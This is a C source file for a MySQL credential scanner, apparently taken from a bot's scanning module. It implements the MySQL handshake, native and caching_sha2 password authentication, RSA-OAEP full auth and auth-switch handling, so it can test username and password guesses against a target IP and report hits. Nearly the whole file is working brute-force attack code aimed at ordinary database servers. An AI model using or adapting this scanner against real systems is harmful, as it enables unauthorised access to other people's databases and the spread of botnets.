/* mysql.c -- MySQL credential scanner (single-target-try)
   Extracted from bot/scanner_mysql.c, scaffolding removed.
   Uses shared crypto/sha1.h instead of inline SHA-1. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdint.h>

#include "mysql.h"
#include "../crypto/sha1.h"
#include "../crypto/sha256.h"
#include "../crypto/bignum.h"
#include "../core/util.h"

/* MySQL native auth: SHA1(pass) XOR SHA1(salt + SHA1(SHA1(pass))) */
static void mysql_native_auth(const uint8_t *salt, int salt_len,
                              const char *password, uint8_t out[20]) {
    uint8_t stage1[20], stage2[20], hash_salt[20];
    sha1_ctx ctx;
    int i;

    sha1_oneshot((const uint8_t *)password, strlen(password), stage1);
    sha1_oneshot(stage1, 20, stage2);
    sha1_init(&ctx);
    sha1_update(&ctx, salt, (size_t)salt_len);
    sha1_update(&ctx, stage2, 20);
    sha1_final(&ctx, hash_salt);
    for (i = 0; i < 20; i++)
        out[i] = stage1[i] ^ hash_salt[i];
}

/* caching_sha2_password auth (MySQL 8.0+):
   SHA256(password) XOR SHA256(SHA256(SHA256(password)) + scramble) */
static void mysql_caching_sha2_auth(const uint8_t *salt, int salt_len,
                                    const char *password, uint8_t out[32]) {
    uint8_t hash1[32], hash2[32], hash3[32];
    sha256_ctx_t ctx;
    int i;

    sha256_oneshot((const uint8_t *)password, strlen(password), hash1);
    sha256_oneshot(hash1, 32, hash2);
    sha256_init(&ctx);
    sha256_update(&ctx, hash2, 32);
    sha256_update(&ctx, salt, (size_t)salt_len);
    sha256_finish(&ctx, hash3);
    for (i = 0; i < 32; i++)
        out[i] = hash1[i] ^ hash3[i];
}

/* ---- Base64 decode (for RSA public key PEM) ---- */

static int mysql_b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int mysql_b64_decode(const char *in, int in_len, uint8_t *out, int out_max) {
    int i, o = 0;
    for (i = 0; i + 3 < in_len; i += 4) {
        int a = mysql_b64_val(in[i]), b = mysql_b64_val(in[i + 1]);
        int c = mysql_b64_val(in[i + 2]), d = mysql_b64_val(in[i + 3]);
        if (a < 0 || b < 0) break;
        if (o >= out_max) return -1;
        out[o++] = (uint8_t)((a << 2) | (b >> 4));
        if (in[i + 2] != '=' && c >= 0) {
            if (o >= out_max) return -1;
            out[o++] = (uint8_t)(((b & 0xF) << 4) | (c >> 2));
            if (in[i + 3] != '=' && d >= 0) {
                if (o >= out_max) return -1;
                out[o++] = (uint8_t)(((c & 0x3) << 6) | d);
            }
        }
    }
    return o;
}

/* ---- Minimal DER parser for RSA SubjectPublicKeyInfo ---- */

static int der_read_len(const uint8_t *data, int max, int *pos) {
    int len;
    if (*pos >= max) return -1;
    if (!(data[*pos] & 0x80)) {
        len = data[*pos]; (*pos)++;
    } else {
        int nb = data[*pos] & 0x7F; (*pos)++;
        if (nb > 4 || *pos + nb > max) return -1;
        len = 0;
        while (nb--) { len = (len << 8) | data[*pos]; (*pos)++; }
    }
    return len;
}

static int parse_rsa_pubkey(const uint8_t *der, int der_len, bn_t *n, bn_t *e) {
    int pos = 0, len, n_len, e_len;
    /* Outer SEQUENCE */
    if (pos >= der_len || der[pos++] != 0x30) return -1;
    if (der_read_len(der, der_len, &pos) < 0) return -1;
    /* AlgorithmIdentifier SEQUENCE -- skip */
    if (pos >= der_len || der[pos++] != 0x30) return -1;
    len = der_read_len(der, der_len, &pos);
    if (len < 0) return -1;
    pos += len;
    /* BIT STRING */
    if (pos >= der_len || der[pos++] != 0x03) return -1;
    if (der_read_len(der, der_len, &pos) < 0) return -1;
    if (pos >= der_len) return -1;
    pos++; /* skip unused-bits byte */
    /* Inner SEQUENCE (RSAPublicKey) */
    if (pos >= der_len || der[pos++] != 0x30) return -1;
    if (der_read_len(der, der_len, &pos) < 0) return -1;
    /* INTEGER n */
    if (pos >= der_len || der[pos++] != 0x02) return -1;
    n_len = der_read_len(der, der_len, &pos);
    if (n_len < 0 || pos + n_len > der_len) return -1;
    if (n_len > 0 && der[pos] == 0x00) { pos++; n_len--; } /* strip sign byte */
    bn_from_bytes(n, der + pos, n_len);
    pos += n_len;
    /* INTEGER e */
    if (pos >= der_len || der[pos++] != 0x02) return -1;
    e_len = der_read_len(der, der_len, &pos);
    if (e_len < 0 || pos + e_len > der_len) return -1;
    if (e_len > 0 && der[pos] == 0x00) { pos++; e_len--; }
    bn_from_bytes(e, der + pos, e_len);
    return 0;
}

/* ---- RSA-OAEP encryption (SHA-1, empty label) for caching_sha2 full auth ---- */

static void mgf1_sha1(const uint8_t *seed, int seed_len,
                       uint8_t *mask, int mask_len) {
    uint32_t ctr = 0;
    int pos = 0;
    while (pos < mask_len) {
        sha1_ctx ctx;
        uint8_t hash[20], cbuf[4];
        int take;
        cbuf[0] = (uint8_t)(ctr >> 24); cbuf[1] = (uint8_t)(ctr >> 16);
        cbuf[2] = (uint8_t)(ctr >> 8);  cbuf[3] = (uint8_t)ctr;
        sha1_init(&ctx);
        sha1_update(&ctx, seed, (size_t)seed_len);
        sha1_update(&ctx, cbuf, 4);
        sha1_final(&ctx, hash);
        take = (mask_len - pos < 20) ? mask_len - pos : 20;
        memcpy(mask + pos, hash, (size_t)take);
        pos += take;
        ctr++;
    }
}

/* Encrypt msg with RSA-OAEP (SHA-1). out must be key_bytes long. */
static int rsa_oaep_encrypt(const bn_t *n_bn, const bn_t *e_bn,
                            const uint8_t *msg, int msg_len,
                            uint8_t *out, int key_bytes) {
    int hlen = 20; /* SHA-1 */
    int db_len = key_bytes - hlen - 1;
    int ps_len, i, c_len;
    uint8_t em[512], db[512], seed[20], dbmask[512], seedmask[20], lhash[20];
    bn_t m_bn, c_bn;

    if (key_bytes > 512 || msg_len > db_len - hlen - 1) return -1;
    ps_len = db_len - hlen - 1 - msg_len;

    /* lHash = SHA-1("") */
    sha1_oneshot((const uint8_t *)"", 0, lhash);

    /* DB = lHash || PS(zeros) || 0x01 || msg */
    memcpy(db, lhash, (size_t)hlen);
    if (ps_len > 0) memset(db + hlen, 0, (size_t)ps_len);
    db[hlen + ps_len] = 0x01;
    memcpy(db + hlen + ps_len + 1, msg, (size_t)msg_len);

    urandom_bytes(seed, 20);

    /* maskedDB = DB ^ MGF1(seed) */
    mgf1_sha1(seed, hlen, dbmask, db_len);
    for (i = 0; i < db_len; i++) db[i] ^= dbmask[i];

    /* maskedSeed = seed ^ MGF1(maskedDB) */
    mgf1_sha1(db, db_len, seedmask, hlen);
    for (i = 0; i < hlen; i++) seed[i] ^= seedmask[i];

    /* EM = 0x00 || maskedSeed || maskedDB */
    em[0] = 0x00;
    memcpy(em + 1, seed, (size_t)hlen);
    memcpy(em + 1 + hlen, db, (size_t)db_len);

    /* RSA encrypt: c = m^e mod n */
    bn_from_bytes(&m_bn, em, key_bytes);
    bn_modexp(&c_bn, &m_bn, e_bn, n_bn);

    /* Output exactly key_bytes, zero-padded */
    c_len = bn_to_bytes(&c_bn, out, key_bytes);
    if (c_len < 0) return -1;
    if (c_len < key_bytes) {
        memmove(out + (key_bytes - c_len), out, (size_t)c_len);
        memset(out, 0, (size_t)(key_bytes - c_len));
    }
    return key_bytes;
}

/* Encrypt password for caching_sha2 full auth:
   XOR (password + NUL) with scramble (cycling), then RSA-OAEP encrypt.
   pem is the PEM-encoded server public key.
   Returns encrypted length on success, -1 on error. */
static int mysql_rsa_encrypt_password(const char *password, const uint8_t *scramble,
                                      int scramble_len, const char *pem,
                                      uint8_t *out, int out_max) {
    uint8_t der[1024];
    int der_len, key_bytes;
    char b64_clean[2048];
    int b64_len = 0;
    const char *p, *b64_start, *b64_end;
    bn_t n, e;
    int pass_len, i;
    uint8_t xor_buf[256];

    b64_start = strstr(pem, "-----BEGIN PUBLIC KEY-----");
    if (!b64_start) return -1;
    b64_start += 26;
    b64_end = strstr(b64_start, "-----END PUBLIC KEY-----");
    if (!b64_end) return -1;

    for (p = b64_start; p < b64_end; p++) {
        if (*p != '\n' && *p != '\r' && *p != ' ')
            b64_clean[b64_len++] = *p;
    }
    der_len = mysql_b64_decode(b64_clean, b64_len, der, (int)sizeof(der));
    if (der_len <= 0) return -1;

    if (parse_rsa_pubkey(der, der_len, &n, &e) < 0) return -1;

    key_bytes = n.len;
    if (key_bytes > out_max) return -1;

    /* XOR password + NUL with scramble (cycling) */
    pass_len = (int)strlen(password) + 1; /* include NUL */
    if (pass_len > (int)sizeof(xor_buf)) return -1;
    for (i = 0; i < pass_len; i++)
        xor_buf[i] = ((const uint8_t *)password)[i] ^ scramble[i % scramble_len];

    return rsa_oaep_encrypt(&n, &e, xor_buf, pass_len, out, key_bytes);
}

/* Handle caching_sha2 post-auth response (fast auth / full auth via RSA).
   Returns 1=hit, 0=miss, -1=error. Always closes fd. */
static int mysql_handle_sha2(int fd, const char *pass,
                             const uint8_t *salt, int salt_len, int seq) {
    uint8_t buf[4096];
    int n;

    n = (int)recv(fd, buf, sizeof(buf), 0);
    if (n < 5) { close(fd); return -1; }

    if (buf[4] == 0x00) { close(fd); return 1; }
    if (buf[4] == 0xFF) { close(fd); return 0; }

    /* Auth switch (server wants a different plugin) */
    if (buf[4] == 0xFE && n > 5) {
        char *plugin = (char *)buf + 5;
        int plugin_len = (int)strlen(plugin);
        int salt_start = 5 + plugin_len + 1;
        int new_salt_len = n - salt_start;
        uint8_t new_salt[20];

        if (new_salt_len > 20) new_salt_len = 20;
        if (new_salt_len <= 0) { close(fd); return 0; }
        memcpy(new_salt, buf + salt_start, (size_t)new_salt_len);
        if (new_salt_len > 0 && new_salt[new_salt_len - 1] == 0) new_salt_len--;

        if (strcmp(plugin, "mysql_native_password") == 0) {
            uint8_t new_auth[20];
            uint8_t resp_pkt[24];
            mysql_native_auth(new_salt, new_salt_len, pass, new_auth);
            resp_pkt[0] = 20; resp_pkt[1] = 0; resp_pkt[2] = 0;
            resp_pkt[3] = (uint8_t)seq;
            memcpy(resp_pkt + 4, new_auth, 20);
            send(fd, resp_pkt, 24, MSG_NOSIGNAL);
            n = (int)recv(fd, buf, sizeof(buf), 0);
            close(fd);
            if (n >= 5 && buf[4] == 0x00) return 1;
            if (n >= 5 && buf[4] == 0xFF) return 0;
            return -1;
        }
        close(fd);
        return 0;
    }

    if (buf[4] == 0x01 && n >= 6) {
        if (buf[5] == 0x03) {
            /* Fast auth success -- next packet is OK */
            n = (int)recv(fd, buf, sizeof(buf), 0);
            close(fd);
            return (n >= 5 && buf[4] == 0x00) ? 1 : -1;
        }
        if (buf[5] == 0x04) {
            /* Full auth -- request server RSA public key */
            uint8_t req[5] = {1, 0, 0, 0, 0x02};
            req[3] = (uint8_t)seq++;
            if (send(fd, req, 5, MSG_NOSIGNAL) <= 0) { close(fd); return -1; }

            n = (int)recv(fd, buf, sizeof(buf), 0);
            if (n < 6 || buf[4] != 0x01) { close(fd); return -1; }

            /* Parse PEM and RSA-encrypt the password */
            {
                int pem_len = n - 5;
                char pem[2048];
                uint8_t encrypted[512];
                int enc_len;
                uint8_t enc_pkt[520];

                if (pem_len >= (int)sizeof(pem)) { close(fd); return -1; }
                memcpy(pem, buf + 5, (size_t)pem_len);
                pem[pem_len] = '\0';

                enc_len = mysql_rsa_encrypt_password(pass, salt, salt_len,
                                                     pem, encrypted, (int)sizeof(encrypted));
                if (enc_len <= 0) { close(fd); return -1; }

                enc_pkt[0] = (uint8_t)enc_len;
                enc_pkt[1] = (uint8_t)(enc_len >> 8);
                enc_pkt[2] = (uint8_t)(enc_len >> 16);
                enc_pkt[3] = (uint8_t)(seq + 1);
                memcpy(enc_pkt + 4, encrypted, (size_t)enc_len);
                if (send(fd, enc_pkt, (size_t)(4 + enc_len), MSG_NOSIGNAL) <= 0) {
                    close(fd); return -1;
                }
            }

            n = (int)recv(fd, buf, sizeof(buf), 0);
            close(fd);
            if (n >= 5 && buf[4] == 0x00) return 1;
            if (n >= 5 && buf[4] == 0xFF) return 0;
            return -1;
        }
    }

    close(fd);
    return -1;
}

int mysql_try(const char *ip, const char *user, const char *pass,
              const mysql_opts_t *opts, char *version_out, int versz) {
    int fd, n, pos;
    uint8_t buf[4096];
    uint8_t salt[20];
    int salt_len = 0;
    uint8_t auth_resp[32];
    int auth_resp_len;
    uint8_t pkt[600];
    int pkt_len;
    int use_sha2 = 0;

    if (version_out && versz > 0) version_out[0] = '\0';

    fd = tcp_connect(ip, opts->port, opts->timeout);
    if (fd < 0) return -1;

    /* 1. Read server greeting */
    n = (int)recv(fd, buf, sizeof(buf), 0);
    if (n < 40) { close(fd); return -1; }

    /* Parse greeting: [3 len][1 seq][1 proto_ver][version_string\0][4 thread_id][8 salt1][1 filler]... */
    pos = 4; /* skip packet header */
    if (buf[pos] == 0xFF) { close(fd); return -1; } /* ERR packet */

    /* Extract server version for reporting */
    {
        char *ver_start = (char *)buf + pos + 1; /* skip proto version byte */
        char *ver_end = strchr(ver_start, '\0');
        if (ver_end && ver_end - ver_start < versz) {
            memcpy(version_out, ver_start, (size_t)(ver_end - ver_start));
            version_out[ver_end - ver_start] = '\0';
        }
        pos = (int)(ver_end - (char *)buf) + 1;
    }

    pos += 4; /* thread_id */
    memcpy(salt, buf + pos, 8); salt_len = 8; pos += 8;
    pos++; /* filler */
    pos += 2; /* capability lower */
    pos++; /* charset */
    pos += 2; /* status */
    pos += 2; /* capability upper */
    pos++; /* auth plugin data len */
    pos += 10; /* reserved */

    /* salt part 2 (12 bytes) */
    if (pos + 12 <= n) {
        memcpy(salt + 8, buf + pos, 12);
        salt_len = 20;
        pos += 13; /* 12 data bytes + NUL terminator */
    }

    /* Detect auth plugin from greeting */
    if (pos < n && strncmp((const char *)buf + pos, "caching_sha2_password", 21) == 0)
        use_sha2 = 1;

    /* 2. Build auth response */
    if (use_sha2) {
        mysql_caching_sha2_auth(salt, salt_len, pass, auth_resp);
        auth_resp_len = 32;
    } else {
        mysql_native_auth(salt, salt_len, pass, auth_resp);
        auth_resp_len = 20;
    }

    /* 3. Build handshake response packet */
    {
        const char *plugin = use_sha2 ? "caching_sha2_password" : "mysql_native_password";
        int plugin_name_len = (int)strlen(plugin) + 1; /* include NUL */

        pkt_len = 4; /* skip header, fill later */
        /* Client capabilities (4 bytes LE):
         * CLIENT_LONG_PASSWORD(1) | CLIENT_FOUND_ROWS(2) | CLIENT_LONG_FLAG(4) |
         * CLIENT_PROTOCOL_41(0x200) | CLIENT_SECURE_CONNECTION(0x8000) |
         * CLIENT_PLUGIN_AUTH(0x80000) */
        pkt[pkt_len++] = 0x07; pkt[pkt_len++] = 0x82;
        pkt[pkt_len++] = 0x08; pkt[pkt_len++] = 0x00;
        /* Max packet size (4 bytes) */
        pkt[pkt_len++] = 0x00; pkt[pkt_len++] = 0x00; pkt[pkt_len++] = 0x00; pkt[pkt_len++] = 0x01;
        /* Charset (1 byte) -- utf8 */
        pkt[pkt_len++] = 0x21;
        /* Reserved (23 bytes of zeros) */
        memset(pkt + pkt_len, 0, 23); pkt_len += 23;
        /* Username (null-terminated) */
        { int ul = (int)strlen(user); memcpy(pkt + pkt_len, user, (size_t)ul + 1); pkt_len += ul + 1; }
        /* Auth response length + data (CLIENT_SECURE_CONNECTION format) */
        pkt[pkt_len++] = (uint8_t)auth_resp_len;
        memcpy(pkt + pkt_len, auth_resp, (size_t)auth_resp_len); pkt_len += auth_resp_len;
        /* Auth plugin name */
        memcpy(pkt + pkt_len, plugin, (size_t)plugin_name_len); pkt_len += plugin_name_len;

        /* Fill packet header: [3 len LE][1 seq=1] */
        { int payload_len = pkt_len - 4;
          pkt[0] = (uint8_t)payload_len; pkt[1] = (uint8_t)(payload_len >> 8); pkt[2] = (uint8_t)(payload_len >> 16);
          pkt[3] = 1; /* sequence number */
        }
    }

    if (send(fd, pkt, (size_t)pkt_len, MSG_NOSIGNAL) <= 0) { close(fd); return -1; }

    /* 4. Read response */
    if (use_sha2) {
        /* caching_sha2 may need multi-step auth (fast auth / RSA full auth) */
        return mysql_handle_sha2(fd, pass, salt, salt_len, 3);
    }

    n = (int)recv(fd, buf, sizeof(buf), 0);
    if (n < 5) { close(fd); return -1; }

    if (buf[4] == 0x00) { close(fd); return 1; }  /* OK packet */
    if (buf[4] == 0xFF) { close(fd); return 0; }  /* ERR -- auth failed */

    if (buf[4] == 0xFE && n > 5) {
        /* Auth switch request */
        char *plugin = (char *)buf + 5;
        int plugin_len = (int)strlen(plugin);
        int salt_start = 5 + plugin_len + 1;
        uint8_t new_salt[20];
        int new_salt_len = n - salt_start;

        if (new_salt_len > 20) new_salt_len = 20;
        if (new_salt_len <= 0) { close(fd); return 0; }
        memcpy(new_salt, buf + salt_start, (size_t)new_salt_len);
        if (new_salt_len > 0 && new_salt[new_salt_len - 1] == 0) new_salt_len--;

        if (strcmp(plugin, "caching_sha2_password") == 0) {
            /* Switched to caching_sha2 -- send SHA-256 auth response */
            uint8_t sha2_auth[32];
            uint8_t resp_pkt[36];
            mysql_caching_sha2_auth(new_salt, new_salt_len, pass, sha2_auth);
            resp_pkt[0] = 32; resp_pkt[1] = 0; resp_pkt[2] = 0; resp_pkt[3] = 3;
            memcpy(resp_pkt + 4, sha2_auth, 32);
            if (send(fd, resp_pkt, 36, MSG_NOSIGNAL) <= 0) { close(fd); return -1; }
            return mysql_handle_sha2(fd, pass, new_salt, new_salt_len, 5);
        } else {
            /* Switched to mysql_native_password */
            uint8_t new_auth[20];
            uint8_t resp_pkt[24];
            mysql_native_auth(new_salt, new_salt_len, pass, new_auth);
            resp_pkt[0] = 20; resp_pkt[1] = 0; resp_pkt[2] = 0; resp_pkt[3] = 3;
            memcpy(resp_pkt + 4, new_auth, 20);
            send(fd, resp_pkt, 24, MSG_NOSIGNAL);

            n = (int)recv(fd, buf, sizeof(buf), 0);
            close(fd);
            if (n >= 5 && buf[4] == 0x00) return 1;
            if (n >= 5 && buf[4] == 0xFF) return 0;
            return -1;
        }
    }

    close(fd);
    return -1;
}
